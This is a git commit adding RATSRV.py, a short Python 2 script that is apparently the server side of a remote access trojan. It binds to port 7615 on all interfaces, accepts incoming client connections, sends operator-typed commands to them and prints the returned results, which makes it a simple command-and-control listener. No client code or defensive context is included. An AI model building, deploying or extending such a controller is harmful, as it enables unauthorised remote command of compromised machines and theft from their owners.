51754cd6cf55f07f83046ebf6c128ee7a537c578
Jason Phillips <jaosn.phillips@hpfm.com>
2018-11-09 14:43:13 -0600

    Initial commit

---
+++ RATSRV.py
@@ -0,0 +1,39 @@
+import socket
+import threading
+
+bind_ip = "0.0.0.0"
+bind_port = 7615
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((bind_ip, bind_port))
+server.listen(5)
+print"[*] Listening on %s:%d" % (bind_ip, bind_port)
+
+
+def sendmsg(client_socket):
+    while True:
+        try:
+            command = raw_input()
+            if (command == "disconnect"):
+                client_socket.close()
+                server.close()
+                exit()
+            client_socket.send(command)
+        except Exception as e:
+            print "Connection lost %s" % (addr[0],)
+            break
+
+
+def listen(client_socket):
+    while True:
+        results = client_socket.recv(4096)
+        print"[%s] Sent: \n%s" % (addr[0], results)
+
+
+while True:
+    print "Starting Server...."
+    client, addr = server.accept()
+    print "[*] Connection Accepted from %s:%d" % (addr[0], addr[1])
+    send = threading.Thread(target=sendmsg, args=(client,))
+    hear = threading.Thread(target=listen, args=(client,))
+    send.start()
+    hear.start()
